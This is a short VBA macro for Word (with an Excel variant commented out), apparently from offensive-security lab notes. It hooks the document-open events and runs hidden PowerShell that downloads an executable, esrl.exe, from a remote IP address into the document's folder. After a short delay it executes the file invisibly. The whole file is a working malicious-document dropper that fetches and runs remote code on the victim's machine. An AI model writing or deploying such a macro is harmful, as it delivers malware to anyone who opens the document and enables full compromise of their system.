Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.83/esrl.exe','esrl.exe')"
    Shell str, vbHide

    ' Luckily, downloaded content will end up in the current folder of the Word document and we can obtain the path name with the ActiveDocument.Path
    Dim exePath As String
    ' Word
    exePath = ActiveDocument.Path + "\esrl.exe"
    ' Excel
    ' exePath = Application.ActiveWorkbook.path + "\esrl.exe"
    Wait (2)
    Shell exePath, vbHide
End Sub

' introduce delay as download time my vary
Sub Wait(n As Long)
    Dim t as Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub